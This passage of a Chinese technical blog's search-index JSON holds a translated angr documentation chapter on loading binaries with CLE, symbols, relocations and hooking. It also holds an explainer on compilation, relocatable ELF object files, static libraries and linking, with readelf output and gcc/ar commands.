[0x1000000:0x13c999f]\u003e, \u003cELF Object ld-2.23.so, maps [0x2000000:0x2227167]\u003e, \u003cELFTLSObject Object cle##tls, maps [0x3000000:0x3015010]\u003e, \u003cExternObject Object cle##externs, maps [0x4000000:0x4008000]\u003e, \u003cKernelObject Object cle##kernel, maps [0x5000000:0x5008000]\u003e] # 这是main对象，你在加载项目时直接指定的对象 \u003e\u003e\u003e proj.loader.main_object \u003cELF Object fauxware, maps [0x400000:0x60105f]\u003e # 这是动态链接库对象名称和到对象的映射字典 \u003e\u003e\u003e proj.loader.shared_objects { 'fauxware': \u003cELF Object fauxware, maps [0x400000:0x60105f]\u003e, 'libc.so.6': \u003cELF Object libc-2.23.so, maps [0x1000000:0x13c999f]\u003e, 'ld-linux-x86-64.so.2': \u003cELF Object ld-2.23.so, maps [0x2000000:0x2227167]\u003e } # 这是从ELF文件加载的所有对象 # 如果这是windows文件，你可以使用all_pe_objects \u003e\u003e\u003e proj.loader.all_elf_objects [\u003cELF Object fauxware, maps [0x400000:0x60105f]\u003e, \u003cELF Object libc-2.23.so, maps [0x1000000:0x13c999f]\u003e, \u003cELF Object ld-2.23.so, maps [0x2000000:0x2227167]\u003e] # 这是externs对象，它用来为未解析的导入符号和angr内部运行提供地址 \u003e\u003e\u003e proj.loader.extern_object \u003cExternObject Object cle##externs, maps [0x4000000:0x4008000]\u003e # 该对象为模拟系统调用提供地址 \u003e\u003e\u003e proj.loader.kernel_object \u003cKernelObject Object cle##kernel, maps [0x5000000:0x5008000]\u003e # 最后，你可以获得给定地址对象的引用 \u003e\u003e\u003e proj.loader.find_object_containing(0x400000) \u003cELF Object fauxware, maps [0x400000:0x60105f]\u003e 你可以直接与这些对象交互，从中提取数据 \u003e\u003e\u003e obj = proj.loader.main_object # 对象的入口点 \u003e\u003e\u003e obj.entry 0x400580 \u003e\u003e\u003e obj.mmin_addr, obj.max_addr (0x400000, 0x60105f) # 查看ELF文件的段（segmets）和节（section） \u003e\u003e\u003e obj.segments \u003cRegions: [\u003cELFSegment memsize=0xa74, filesize=0xa74, vaddr=0x400000, flags=0x5, offset=0x0\u003e, \u003cELFSegment memsize=0x238, filesize=0x228, vaddr=0x600e28, flags=0x6, offset=0xe28\u003e]\u003e \u003e\u003e\u003e obj.sections \u003cRegions: [\u003cUnnamed | offset 0x0, vaddr 0x0, size 0x0\u003e, \u003c.interp | offset 0x238, vaddr 0x400238, size 0x1c\u003e, \u003c.note.ABI-tag | offset 0x254, vaddr 0x400254, size 0x20\u003e, ...etc # 你可以给定地址获取特定的段和节 \u003e\u003e\u003e obj.find_segment_containing(obj.entry) \u003cELFSegment memsize=0xa74, filesize=0xa74, vaddr=0x400000, flags=0x5, offset=0x0\u003e \u003e\u003e\u003e obj.find_section_containing(obj.entry) \u003c.text | offset 0x580, vaddr 0x400580, size 0x338\u003e # 获取符号在PLT表中的地址，或根据地址取得相应的符号 \u003e\u003e\u003e addr = obj.plt['strcmp'] \u003e\u003e\u003e addr 0x400550 \u003e\u003e\u003e obj.reverse_plt[addr] 'strcmp' # 显示对象的预链接基地址及它实际被CLE映射到内存中的地址 \u003e\u003e\u003e obj.linked_base 0x400000 \u003e\u003e\u003e obj.mapped_base 0x400000 ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:2:0","tags":["reverse","angr"],"title":"angr文档翻译（三）Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"符号和重定位（Symbols and Relocations） 你也可以使用CLE操作符号。符号是可执行文件中的一个重要的概念，实现了名称到地址的映射。 从CLE中获取一个符号最简单的方法是使用loader.find_symbol，它接收一个符号名或地址作为参数，返回一个符号对象 \u003e\u003e\u003e strcmp = proj.loader.find_symbol('strcmp') \u003e\u003e\u003e strcmp \u003cSymbol \"strcmp\" in libc.so.6 at 0x1089cd0\u003e 一个符号最有用的属性是它的名称、所有者和地址，但符号的地址表示不止一种，symbol对象地址有三种表示方式： .rebased_addr是符号在全局地址空间的地址，这就是在上面命令屏幕上输出的地址 .linked_addr是它相对于二进制文件预链接（prelink）基址的地址。这个地址会在例如readelf(1)中显示 .relative_addr是它相对于对象基地址的地址。这经常在文献中被使用（尤其在windows文档），被称为RVA（relative virtual address） \u003e\u003e\u003e strcmp.name 'strcmp' \u003e\u003e\u003e strcmp.owner \u003cELF Object libc-2.23.so, maps [0x1000000:0x13c999f]\u003e \u003e\u003e\u003e strcmp.rebased_addr 0x1089cd0 \u003e\u003e\u003e strcmp.linked_addr 0x89cd0 \u003e\u003e\u003e strcmp.relative_addr 0x89cd0 除了提供调试信息之外，符号对象也支持动态链接。libc提供了如strcmp等外部符号，而main程序需要使用它。如果我们让CLE直接从main对象给我们一个strcmp符号，它会告诉你这是个导入符号。导入符号并没有与之关联的有意义的地址，但它们提供了用于解析它们的引用，通过.resolvedby属性可以得到。 \u003e\u003e\u003e strcmp.is_export True \u003e\u003e\u003e strcmp.is_import False # 在加载器层面，这条指令是find_symbol,因为它是执行了搜索命令查找符号 # 在一个特定的对象层面，这条指令是get_symbol，因为一个指定的名称只有一个符号与之对应 \u003e\u003e\u003e main_strcmp = proj.loader.main_object.get_symbol('strcmp') \u003e\u003e\u003e main_strcmp \u003cSymbol \"strcmp\" in fauxware (import)\u003e \u003e\u003e\u003e main_strcmp.is_export False \u003e\u003e\u003e main_strcmp.is_import True \u003e\u003e\u003e main_strcmp.resolvedby \u003cSymbol \"strcmp\" in libc.so.6 at 0x1089cd0\u003e 通过链接在内存中将外部符号注册为导入符号由另一个概念“重定位”处理。重定位将[import]和外部符号匹配，将导出地址写入[location]，格式为[format]。使用obj.relocs可以看到一个对象完整的重定位表（重定位实例），或者使用obj.imports获取从符号名到重定位表项的映射，这里没有给出相应的外部符号 重定位对应的导入符号可以用.symbol访问，重定位写入的地址可通过Symbol对象的任何地址标识符得到，你也可以使用.owner获取对重定位对象的引用。 # 重定位表项无法很好的打印, 所以这些地址是python内部的, 与angr无关 \u003e\u003e\u003e proj.loader.shared_objects['libc.so.6'].imports {'__libc_enable_secure': \u003ccle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fce780\u003e, '__tls_get_addr': \u003ccle.backends.elf.relocation.amd64.R_X86_64_JUMP_SLOT at 0x7ff5c6018358\u003e, '_dl_argv': \u003ccle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fd2e48\u003e, '_dl_find_dso_for_object': \u003ccle.backends.elf.relocation.amd64.R_X86_64_JUMP_SLOT at 0x7ff5c6018588\u003e, '_dl_starting_up': \u003ccle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fd2550\u003e, '_rtld_global': \u003ccle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fce4e0\u003e, '_rtld_global_ro': \u003ccle.backends.elf.relocation.amd64.R_X86_64_GLOB_DAT at 0x7ff5c5fcea20\u003e} 如果导入符号无法解析为任何外部符号，例如，一个需要的共享库无法找到，CLE会自动将其更新为外部对象（loader.extern_obj），表明CLE提供这个符号作为外部符号。 ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:3:0","tags":["reverse","angr"],"title":"angr文档翻译（三）Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"加载选项（Loading Options） 如果你使用angr.Project来加载某些内容，那么你传递给Project构造器的关键词参数会直接传递给cle.Loader。如果你想了解所有可以使用的参数，你应该查看CLE API docs。在下面我们会介绍一些重要且常用的选项。 ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:4:0","tags":["reverse","angr"],"title":"angr文档翻译（三）Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"基本选项（Basic Options） auto_load_libs用来指定是否启用CLE自动加载共享库，默认开启。相反的，except_missing_libs，设置为true时如果二进制文件存在无法解析的共享库依赖时，会引发一个异常。 force_load_libs接收一个字符串列表，列表中的字符串被视为必须加载的共享库，或者你可以使用skip_libs传递一个字符串列表跳过指定共享库的解析。可以通过ld_path传递一个字符串列表或字符串作为共享库的额外检索路径，优先级高于程序所在目录、工作目录和系统共享库目录。 ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:4:1","tags":["reverse","angr"],"title":"angr文档翻译（三）Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"二进制加载选项（Pre-Binary Options） CLE同样允许你指定一些仅适用于特定二进制对象的选项，可以使用main_opts和lib_opts参数传递选项字典来实现。main_opts是从选项名称到选项值的映射，lib_opts是从库名称到选项字典的映射。 你可以使用的选项由使用的后端（backend）决定，但一些常见的选项是通用的 backend：使用哪种后端，值为类或名称 base_addr：加载的基地址 entry_point：程序入口点 arch：使用架构的名称 例如： \u003e\u003e\u003e angr.Project('examples/fauxware/fauxware', main_opts={'backend': 'blob', 'arch': 'i386'}, lib_opts={'libc.so.6': {'backend': 'elf'}}) \u003cProject examples/fauxware/fauxware\u003e ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:4:2","tags":["reverse","angr"],"title":"angr文档翻译（三）Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"后端（Backends） CLE目前有静态加载ELF、PE、CGC、Mach-O和ELF core dump 文件的后端，或者把文件加载到一个平坦地址。CLE在大多数情况下会自动检测并使用合适的后端。所以你无需手动指定使用的后端，除非你在做一些非常奇怪的事情。 你可以在选项字典中包含一个键来强制CLE使用特定的后端，但有些后端无法自动检测架构，需要手动指定所需架构。架构的键值无需匹配某一个架构列表，angr会通过几乎所有受支持架构的通用标识符来识别你所指定的架构。 要使用特定的后端，请指定下表的名称： 后端名 描述 是否需要指定arch elf ELF静态加载器，以PyELFTools为基础 否 pe PE静态加载器，以PEFile为基础 否 mach-o Mach-o静态加载器，不支持动态链接和变基 否 cgc Cyber Grand Challenge静态加载器 否 backedgcc CGC二进制文件静态加载器，允许指定内存和注册backers 否 elfcore ELF core dump文件静态加载器 否 blob 作为平坦镜像加载文件 是 ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:4:3","tags":["reverse","angr"],"title":"angr文档翻译（三）Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"符号函数简介（Symbolic Function Summaries） 默认情况下，Project尝试使用SimProcedures替换库函数的外部调用，SimProcedures实际上只是模仿库函数改变运行状态的函数。我们已经实现了许多函数作为SimProcedures。这些内置程序可以通过angr.SIM_PROCEDURES字典访问到。这个字典是两级的，首先指定包名称（如libc、posix、win32、stubs）再指定库函数名。使用SimProcedure来替代实际系统中的库函数可以使分析变得更容易，但也会增加一些潜在的不确定性。 如果给定的函数没有对应的SimProcedure： 如果auto_load_libs=True（这是默认值），那么真正的库函数将会被执行。这不一定是不是你想要的，具体取决于实际功能。libc中的一些函数分析起来可能十分复杂，可能会导致尝试执行它们的路径数激增。 如果auto_load_libs=False，Project会将它们解析成ReturnUnconstrained的SimProcedure，每次调用它都会返回一个唯一的无约束符号值 如果use_sim_procedures=Flase（这是angr.Project的参数，而不是cle.Loader的参数，默认是False），那么只有外部对象提供的符号会被SimProcedures替换，并且将被替换为ReturnUnconstrained，只返回一个符号值而不做其他的事。 你可以指定要排除的符号，使其不被SimProcedures替换。使用angr.Project: exclude_sim_procedures_list和exclude_sim_procedures_func 可以查看angr.Project._register_object的代码来了解确切的算法 ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:5:0","tags":["reverse","angr"],"title":"angr文档翻译（三）Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"Hooking angr可以将库代码替换为python的模拟，这种机制称为hooking，你也可以这么做！ 在进行模拟执行时，angr在每一步都会检查是否有对应的hook函数，如果有，则运行hook函数内容而不是二进制代码。可以使用APIproj.hook（addr, hook），其中hook是一个SimProcedure实例。你可以通过.is_hooked``.unhook``.hooked_by来管理工程中的hooks。 另一个hook函数的替代API，使用proj.hook(addr)作为函数装饰器，你可以将现成的函数作为hook函数。如果你这么做，你可以选择是否指定一个length关键字，在hook函数完成后跳过指定长度的字节继续执行。 \u003e\u003e\u003e stub_func = angr.SIM_PROCEDURES['stubs']['ReturnUnconstrained'] # 这是一个类 \u003e\u003e\u003e proj.hook(0x10000, stub_func()) # 使用类的实例进行hook \u003e\u003e\u003e proj.is_hooked(0x10000) True \u003e\u003e\u003e proj.hooked_by(0x10000) \u003cReturnUnconstrained\u003e \u003e\u003e\u003e proj.unhook(0x10000) \u003e\u003e\u003e @proj.hook(0x20000, length=5) ... def my_hook(state): ... state.regs.rax = 1 \u003e\u003e\u003e proj.is_hooked(0x20000) True 此外，你可以使用proj.hook_symbol(name, hook)，第一个参数是符号的名称，来hook符号所在的地址。一个非常重要的用途是扩展angr的内置SimProcedures库。因为这些库函数都是类，所以你可以创建它们的子类，重载它们的一些行为，然后在hook中使用你的子类。 ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:5:1","tags":["reverse","angr"],"title":"angr文档翻译（三）Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Angr"],"content":"到这里非常棒！（So far so good ！） 到目前为止，你应该对CLE加载程序和Project级别控制分析的环境有一个大致的了解。你还应该明白angr对使用SimProcedures将复杂的库函数hook做出了合理的尝试来简化分析。 要了解您可以使用CLE加载程序及后端可执行的所有操作，请查看CLE API docs ","date":"2022-09-08","objectID":"/2022/09/loading_a_binary/:6:0","tags":["reverse","angr"],"title":"angr文档翻译（三）Loading a Binary","uri":"/2022/09/loading_a_binary/"},{"categories":["Binary"],"content":"C源代码到可执行文件 回顾一下从源代码到可执行文件的基本过程 ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:1:0","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"预处理（pre-processor) 作用：删除注释、文件包含、文本替换、展开宏定义等 命令：cpp、gcc -E main.c –\u003e main.i ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:1:1","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"编译（compiler） 作用：将C源代码编译成汇编代码 命令：cc -S、gcc -S main.i –\u003e main.s ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:1:2","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"汇编（assembler） 作用：将汇编代码转化成可重定向目标文件 命令：as、gcc -c（编译并汇编） main.c –\u003e main.o ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:1:3","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"链接（linker） 作用：组合可重定向目标文件，构造可执行文件 命令：ld –static（需手动加一堆静态库） main.o –\u003e main ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:1:4","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"可重定位目标文件（Relocatable Object Files） 可重定位目标文件是一种ELF（Executable and Linkable Format）文件，由汇编这一步产生。在链接过程中，多个可重定向目标文件被连接器以某一种方式组合，形成最终的可执行文件。 一个可重定向目标文件大致分为三个部分 ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:2:0","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"ELF头（ELF Header） ❯ readelf -h main.o ELF 头： Magic： 7f 45 4c 46 02 01 01 00 01 00 00 00 00 00 00 00 类别: ELF64 数据: 2 补码，小端序 (little endian) Version: 1 (current) OS/ABI: UNIX - System V ABI 版本: 1 类型: REL (可重定位文件) 系统架构: Advanced Micro Devices X86-64 版本: 0x1 入口点地址： 0x0 程序头起点： 0 (bytes into file) Start of section headers: 808 (bytes into file) 标志： 0x0 Size of this header: 64 (bytes) Size of program headers: 0 (bytes) Number of program headers: 0 Size of section headers: 64 (bytes) Number of section headers: 14 Section header string table index: 13 ELF header前16个字节中，前四个字节为魔数，第5个字节为文件类型（0x1-\u003e32位，0x2-\u003e64位），第6个字节为字节序（0x1-\u003e小端序，0x2-\u003e大端序），第7个字节为ELF版本号，通常都为1，后9个字节未定义，用0填充 ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:2:1","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"ELF 节（ELF section） ❯ readelf -S ./main.o # 查看sevtion table There are 14 section headers, starting at offset 0x328: 节头： [号] 名称 类型 地址 偏移量 大小 全体大小 旗标 链接 信息 对齐 [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] .text PROGBITS 0000000000000000 00000040 0000000000000064 0000000000000000 AX 0 0 1 [ 2] .rela.text RELA 0000000000000000 00000220 0000000000000060 0000000000000018 I 11 1 8 [ 3] .data PROGBITS 0000000000000000 000000a4 0000000000000004 0000000000000000 WA 0 0 4 [ 4] .bss NOBITS 0000000000000000 000000a8 0000000000000000 0000000000000000 WA 0 0 1 [ 5] .rodata PROGBITS 0000000000000000 000000a8 0000000000000003 0000000000000000 A 0 0 1 [ 6] .comment PROGBITS 0000000000000000 000000ab 0000000000000013 0000000000000001 MS 0 0 1 [ 7] .note.GNU-stack PROGBITS 0000000000000000 000000be 0000000000000000 0000000000000000 0 0 1 [ 8] .note.gnu.pr[...] NOTE 0000000000000000 000000c0 0000000000000030 0000000000000000 A 0 0 8 [ 9] .eh_frame PROGBITS 0000000000000000 000000f0 0000000000000058 0000000000000000 A 0 0 8 [10] .rela.eh_frame RELA 0000000000000000 00000280 0000000000000030 0000000000000018 I 11 9 8 [11] .symtab SYMTAB 0000000000000000 00000148 00000000000000c0 0000000000000018 12 4 8 [12] .strtab STRTAB 0000000000000000 00000208 0000000000000015 0000000000000000 0 0 1 [13] .shstrtab STRTAB 0000000000000000 000002b0 0000000000000074 0000000000000000 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), D (mbind), l (large), p (processor specific) .text：存放编译好的机器指令 .data：存放已初始化的全局变量和静态变量 .bss：未初始化的全局变量和静态变量和被初始化为0的全局和静态变量，仅在section table中标记占用总空间，不占据实际空间，程序运行时自动在内存中分配这些变量，并赋0 .rodata：存放只读数据 .comment：存放编译器版本信息 .symtab：Symbol Table 符号表 .rel.text：Relocation Table 重定位表 .debug：调试信息 .line：原始C程序中的行号和.text section中机器指令之间的映射 .strtab：String Table 字符串表，与.symtab相比主要用于调试时而不是运行 .shstrtab：section header的字符串表 .eh_frame：gcc处理异常时关于栈展开的记录，参考阅读 ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:2:2","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"静态链接 ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:3:0","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"静态库文件 一般后缀为.a，一种称为archive的特殊文件格式（类似压缩包），是一组可重定位目标文件的集合，如libc.a。可使用ar命令解压所有的可重定位目标文件到当前目录 ar -x /usr/lib/libc.a ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:3:1","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"手动构建静态库 # 使用gcc只编译汇编不链接 gcc -c main.c -o main.o # 使用ar打包成archive文件，可指定多个.o文件（可重定向目标文件） ar rcs libmain.a main.o ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:3:2","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"使用指定静态库链接 # 使用gcc静态链接使用指定静态库，后可跟多个，默认添加libc.a gcc --static -o main main.o ./libmain.a ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:3:3","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"符号解析 链接器在链接过程中维护了三个集合：E、U、D，分别是最终使用的可重定位目标文件、引用了但尚未定义的符号、已定义的符号，三个集合初始均为空。 链接开始，链接器从左至右扫描命令行参数，发现可重定位目标文件，就放入集合E，将已定义的符号加入D中，将为定义的符号加入U中。 发现静态库文件，就尝试对库中每一个可重定向目标文件寻找U中未定义的符号，如果找到，则将这个文件加入集合E，相应删除这个文件中包含的U中未定义的符号。将D中没有的、该文件中定义的其他符号加入D中。逐个扫描静态库中的每个可重定向目标文件，如果U中没有对应的为定义的符号，则该文件被丢弃。 所有文件扫描结束后，如果U是空的，则链接器会合并E中的可重定向目标文件来生成可执行文件。如果U非空，则链接器会输出一个错误而中止。 ","date":"2022-09-08","objectID":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/:3:4","tags":["reverse"],"title":"简析可重定位目标文件和程序链接过程","uri":"/2022/09/%E7%AE%80%E6%9E%90%E5%8F%AF%E9%87%8D%E5%AE%9A%E4%BD%8D%E7%9B%AE%E6%A0%87%E6%96%87%E4%BB%B6%E5%92%8C%E7%A8%8B%E5%BA%8F%E9%93%BE%E6%8E%A5%E8%BF%87%E7%A8%8B/"},{"categories":["Binary"],"content":"重定位 符号解析完成后，连接器会合并各输入模块，为每个符号分配运行时地址 重定位节和符号定义 链接器将多个可重定向目标文件中相同的section合成一个新的section，并为每条指令和全局变量分配运行时地址 重定位节中的符号引用 汇编器在生成可重定位目标文件时，并不知道数据和代码最终放在内存的什么地方，也不知道该模块外引用的外部定义的函数以及全局变量的位置。所以当遇到不确定的符号引用时，汇编器就会生成一个重定向条目，并将不确定的引用地址填0占位。 重定向条目告诉链接器在合成可重定位目标文件时应该如何修改这个引用，.text节的重定位条目放在.rel.text中。 // 重定位条目的结构 typedef struct { long offset; //被修改的引用的节偏移量 long type:32, // 重定位类型l symbol:32; //表示被修改的引用是一个符号 long addend; //常数，一些使用进行偏移调整 }ELF64_Rela 重定位类型常见的有：重定位绝对引用和重定位相对引用，不详细叙述。 